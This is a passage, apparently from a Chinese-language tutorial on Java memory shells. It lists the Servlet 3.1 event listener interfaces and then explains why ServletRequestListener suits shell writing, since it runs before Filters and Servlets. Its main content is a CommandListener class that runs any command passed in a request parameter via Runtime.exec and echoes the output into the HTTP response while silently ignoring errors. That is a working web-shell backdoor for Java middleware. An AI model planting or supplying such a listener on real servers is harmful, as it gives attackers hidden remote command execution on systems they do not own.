# Event Listeners

> [Servlet 3.1 规范 - 事件监听器](https://github.com/waylau/servlet-3.1-specification/blob/master/docs/Application%20Lifecycle%20Events/11.2%20Event%20Listeners.md)

Servlet 事件监听器支持当 ServletContext、HttpSession 和 ServletRequest 状态变更时发送事件通知。每个事件类型的监听器都支持多个，并且开发者可以指定监听器的调用顺序。

| Listener 接口类                                     | 描述                              |
|--------------------------------------------------|---------------------------------|
| javax.servlet.ServletContextListener             | 在 ServletContext 创建以及销毁时        |
| javax.servlet.ServletContextAttributeListener    | 在 ServletContext 添加、移除或替换属性时    |
| javax.servlet.http.HttpSessionListener           | 在 HttpSession 创建和销毁时            |
| javax.servlet.http.HttpSessionAttributeListener  | 在 HttpSession 上添加、移除或替换属性       |
| javax.servlet.http.HttpSessionIdListener         | 在 HttpSession id 变化时            |
| javax.servlet.http.HttpSessionActivationListener | 在 HttpSession 激活或钝化时            |
| javax.servlet.http.HttpSessionBindingListener    | 在 HttpSession 上对象绑定或解绑时         |
| javax.servlet.ServletRequestListener             | 在 ServletRequest 在将要被 Web 容器处理时 |
| javax.servlet.ServletRequestAttributeListener    | 在 ServletRequest 上添加、移除或替换属性时   |
| javax.servlet.AsyncListener                      | 在异步操作开始、超时或完成时                 |

## ServletRequestListener

在编写 shell 时我们需要关注的主要就是 ServletRequestListener，在请求处理之前可以在拿到请求信息并处理（在 Filter 以及 Servlet 之前），由于它作为事件监听器的一员，并没有直接结束请求的机制，因此在对响应体重写等操作结束之后，最后还是会走到 Filter 和 Servlet 的逻辑。

```java
public interface ServletRequestListener extends EventListener {
    public void requestDestroyed(ServletRequestEvent sre);

    /**
     * Receives notification that a ServletRequest is about to come
     * into scope of the web application.
     *
     * @param sre the ServletRequestEvent containing the ServletRequest
     * and the ServletContext representing the web application
     */
    public void requestInitialized(ServletRequestEvent sre);
}
```

以下时使用 ServletRequestListenerShell 命令回显的代码实现。

1. 由于此处只能拿到 ServletRequestEvent，其中只有 ServletRequest，但是一般中间件实现中，ServletRequest 中都会有能获取到 ServletResponse 的方法，因此额外新增了一个 getResponseFromRequest 方法。

```java
public class CommandListener implements ServletRequestListener {
    public static String paramName;

    public CommandListener() {
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            String cmd = request.getParameter(paramName);
            if (cmd != null) {
                HttpServletResponse servletResponse = this.getResponseFromRequest(request);
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                ServletOutputStream outputStream = servletResponse.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
            }
        } catch (Exception ignored) {
        }
    }

    private HttpServletResponse getResponseFromRequest(HttpServletRequest request) throws Exception {
        return null;
    }
}
```
